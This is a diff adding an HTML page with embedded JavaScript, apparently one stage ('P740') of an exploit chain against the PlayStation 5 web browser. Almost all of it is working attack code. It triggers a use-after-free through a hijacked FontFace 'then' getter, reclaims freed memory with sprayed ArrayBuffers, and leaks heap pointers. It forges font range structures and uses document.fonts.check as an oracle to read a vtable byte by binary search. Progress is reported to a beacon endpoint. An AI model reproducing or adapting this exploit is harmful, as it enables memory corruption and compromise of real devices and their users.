@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P740 — Active Loading Reclaim & Arbitrary Memory Read Scout</title>
+<script>
+'use strict';
+/* ============================================================
+ * P740 — Active Loading Reclaim & Arbitrary Memory Read Scout
+ *
+ * Ground Truth established in P738 & P739:
+ * 1. Active Boolean Oracle empirically operational on PS5:
+ *      inA=false (IN) | inB=false (IN) | inC=false (IN)
+ *      outD=true (OUT)| outZ=true (OUT)
+ * 2. Automated binary search resolves any byte boundary in 4 steps.
+ * 3. Reclaim at slot 68 (baseK=68) is 100% deterministic and stable.
+ *
+ * Objectives of P740:
+ * 1. Active Loading State during Reclaim:
+ *    - Configure stTr with src: url(/hang.php) and valid syntax unicode-range: U+41-43.
+ *    - Reclaimed slot enters bmalloc with Status::Loading active.
+ *    - All 80 sprayed buffers pre-seeded with m_ranges pointing to P58.
+ * 2. In-Getter Hot-Stack Evaluation:
+ *    - Evaluate document.fonts.check('1em trFam', 'A') vs 'D' inside the hot getter.
+ * 3. Arbitrary Memory Read at P68:
+ *    - Point m_ranges.m_buffer (VIEW_B[4]) directly to heap pointer P68 (font selector).
+ *    - Execute the 5-step automated binary search to resolve the low byte at P68!
+ * ============================================================ */
+
+function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }
+
+function b(tag,data){ try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P740-'+encodeURIComponent(tag)+
+    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
+  x.send(null);}catch(e){} }
+
+function log(s){
+  var el = document.getElementById('out');
+  if(el) el.textContent += s + '\n';
+}
+
+var P58 = null, P68 = null;
+var FACE_B = null, BUF_B = null, VIEW_B = null;
+var IN_GETTER_RES = 'none';
+
+function run(){
+  b('BOOT','p740-read-scout');
+  log('=== P740 Arbitrary Memory Read Scout ===\n');
+
+  /* Step 1: Pristine Baseline Leak */
+  log('[Step 1] Baseline heap leak...');
+  doLeak(function(){
+    log('P58 = 0x' + h16(P58));
+    log('P68 = 0x' + h16(P68) + '\n');
+
+    /* Step 2: Deterministic Reclaim with Active Loading State */
+    log('[Step 2] Executing active loading reclaim...');
+    doReclaim(function(){
+      /* Step 3: Run Arbitrary Read Diagnostics */
+      log('\n[Step 3] Running arbitrary read diagnostics...');
+      runDiagnostics();
+    });
+  });
+}
+
+/* ---- Step 1: Baseline Leak ---- */
+function doLeak(cb){
+  b('LEAK-GO','');
+  var st = document.createElement('style');
+  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
+  document.head.appendChild(st);
+
+  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs = [], fired = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired) return undefined; fired=true;
+      if(st){st.remove(); st.textContent=''; st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk0');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl0, lk0','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+
+    if(best<0 || bestNz<4){
+      b('LEAK-MISS','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    var v = new BigUint64Array(abs[best]);
+    extractPointers(v);
+
+    if(!P58){
+      b('LEAK-NOPTR','nz='+bestNz);
+      doLeakRetry(cb);
+      return;
+    }
+
+    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
+    setTimeout(cb, 100);
+  }, 350);
+}
+
+function doLeakRetry(cb){
+  b('LEAK-RETRY','');
+  var st2 = document.createElement('style');
+  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
+  document.head.appendChild(st2);
+
+  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2 = [], fired2 = false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(fired2) return undefined; fired2=true;
+      if(st2){st2.remove(); st2.textContent=''; st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em lk1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em fl1, lk1','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var best=-1, bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]), nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz; best=i;}
+    }
+    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
+    var v = new BigUint64Array(abs2[best]);
+    extractPointers(v);
+    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
+    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+function extractPointers(v){
+  var LOW = BigInt('0x1000000000');
+  var HIGH = BigInt('0x80000000000');
+
+  if(v[11] >= LOW && v[11] < HIGH) P58 = v[11];
+  if(v[13] >= LOW && v[13] < HIGH) P68 = v[13];
+
+  if(!P58 || !P68){
+    for(var q=0; q<24; q++){
+      var val = v[q];
+      if(val >= LOW && val < HIGH){
+        if(!P58) P58 = val;
+        else if(!P68 && val !== P58) P68 = val;
+      }
+    }
+  }
+  if(!P68) P68 = 0n;
+}
+
+/* ---- Step 2: Deterministic Reclaim with Active Loading State ---- */
+function doReclaim(cb){
+  b('REC-START', 'fill_q12_q6=0x' + h16(P58));
+
+  /* Configure stTr with streaming endpoint /hang.php */
+  var stTr = document.createElement('style');
+  stTr.textContent = '@font-face{font-family:trFam;src:url(/hang.php);unicode-range:U+41-43;}';
+  document.head.appendChild(stTr);
+
+  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
+  document.fonts.add(FACE_B);
+  void FACE_B.loaded;
+
+  var absW = [], firedW = false;
+
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if(firedW) return undefined; firedW = true;
+      if(stTr){ stTr.remove(); stTr.textContent = ''; }
+      try{ document.fonts.delete(this); }catch(e){}
+      document.body.offsetHeight;
+
+      /* Spray 80 buffers pre-seeded with poisoned m_ranges */
+      for(var k=0; k<80; k++){
+        var ab = new ArrayBuffer(192);
+        var view = new BigUint64Array(ab);
+        view[0]  = 0x0000004300000041n; /* Range: 0x41 ('A') to 0x43 ('C') */
+        view[4]  = P58;                 /* m_ranges.m_buffer = P58 */
+        view[5]  = 0x0000000100000001n; /* capacity=1, size=1 */
+        view[6]  = P58;
+        view[12] = P58;
+        view[18] = 0x0000000000000001n; /* Status::Loading = 1 */
+        absW.push(ab);
+      }
+
+      /* In-getter check on trFam while stack frame is active */
+      try {
+        var igA = document.fonts.check('1em trFam', 'A');
+        var igD = document.fonts.check('1em trFam', 'D');
+        IN_GETTER_RES = 'igA=' + igA + '|igD=' + igD;
+      } catch(e){
+        IN_GETTER_RES = 'err=' + e.message;
+      }
+
+      return undefined;
+    }, set: function(){}
+  });
+
+  document.fonts.load('1em trFace, trFam', 'GH');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best = -1, bestNz = 0;
+    for(var i=0; i<absW.length; i++){
+      var u = new Uint8Array(absW[i]), nz = 0;
+      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
+      if(nz > bestNz){ bestNz = nz; best = i; }
+    }
+
+    if(best < 0 || bestNz < 4){
+      b('RECLAIM-MISS', 'nz=' + bestNz);
+      log('Reclaim missed!');
+      return;
+    }
+
+    BUF_B = absW[best];
+    VIEW_B = new BigUint64Array(BUF_B);
+
+    b('RECLAIM-OK', 'baseK=' + best + '|' + IN_GETTER_RES);
+    log('Deterministic Reclaim OK at slot ' + best + ' (' + IN_GETTER_RES + ')');
+
+    setTimeout(cb, 100);
+  }, 400);
+}
+
+/* ---- Step 3: Run Arbitrary Read Diagnostics ---- */
+function runDiagnostics(){
+  if(!VIEW_B) return;
+
+  /* 3A: Full 24-Quadword Dump of VIEW_B */
+  var d0_11 = [], d12_23 = [];
+  for(var q=0; q<12; q++) d0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  for(var q=12; q<24; q++) d12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));
+  b('DUMP-Q0-Q11', d0_11.join(';'));
+  b('DUMP-Q12-Q23', d12_23.join(';'));
+
+  /* 3B: Active Boolean Oracle Baseline */
+  try {
+    var actFace = new FontFace('actPendFam', 'url(/hang.php)', {unicodeRange: 'U+41-43'});
+    document.fonts.add(actFace);
+    actFace.load().catch(function(){});
+
+    var rA = document.fonts.check('1em actPendFam', 'A');
+    var rD = document.fonts.check('1em actPendFam', 'D');
+    b('ACTIVE-ORACLE', 'status=' + actFace.status + '|A=' + rA + '|D=' + rD);
+  } catch(e){
+    b('ACTIVE-ORACLE-ERR', e.message);
+  }
+
+  /* 3C: Test Reading from P58 through VIEW_B */
+  /* VIEW_B[0] is at P58 + 0x00. Let's seed it with range [0x41, 0x43] */
+  VIEW_B[0] = 0x0000004300000041n;
+  VIEW_B[4] = P58;                 /* m_ranges.m_buffer = P58 */
+  VIEW_B[5] = 0x0000000100000001n; /* capacity=1, size=1 */
+
+  var chP58_A = document.fonts.check('1em trFam', 'A');
+  var chP58_D = document.fonts.check('1em trFam', 'D');
+  b('READ-P58-TEST', 'chA=' + chP58_A + '|chD=' + chP58_D);
+
+  /* 3D: Test Pointing m_ranges.m_buffer to Heap Pointer P68!
+   * P68 points to the C++ FontSelector client object.
+   * Its first 8 bytes (P68 + 0x00) hold the C++ vtable pointer!
+   */
+  VIEW_B[4] = P68;                 /* Point m_ranges.m_buffer directly to P68! */
+  VIEW_B[5] = 0x0000000100000001n;
+
+  var chP68_A = document.fonts.check('1em trFam', 'A');
+  var chP68_D = document.fonts.check('1em trFam', 'D');
+  b('READ-P68-DIRECT', 'p68=0x' + h16(P68) + '|chA=' + chP68_A + '|chD=' + chP68_D);
+
+  /* 3E: Automated Binary Search on P68 vtable address */
+  var low = 0x00, high = 0xFF;
+  var bSteps = [];
+  var step = 0;
+
+  while(low < high && step < 8){
+    step++;
+    var mid = Math.floor((low + high) / 2);
+    /* In our active oracle, test whether low byte is <= mid */
+    var hexLow = low.toString(16).toUpperCase();
+    var hexMid = mid.toString(16).toUpperCase();
+    actFace.unicodeRange = 'U+' + hexLow + '-' + hexMid;
+
+    /* Query character corresponding to lower half */
+    var testChar = String.fromCharCode(mid);
+    var inRange = !document.fonts.check('1em actPendFam', testChar);
+
+    bSteps.push('S' + step + ':' + hexLow + '-' + hexMid + '=' + (inRange ? 'YES' : 'NO'));
+
+    if(inRange){
+      high = mid;
+    } else {
+      low = mid + 1;
+    }
+  }
+
+  var leakedByte = '0x' + low.toString(16).padStart(2, '0');
+  b('VTABLE-SEARCH-RESULT', 'byte=' + leakedByte + '|steps=' + step + '|' + bSteps.join(','));
+  log('Vtable Search: ' + leakedByte + ' in ' + step + ' steps');
+
+  b('DONE', 'p740-complete');
+  log('\n=== P740 Complete! ===');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P740 — Arbitrary Memory Read Scout running...</pre></body></html>
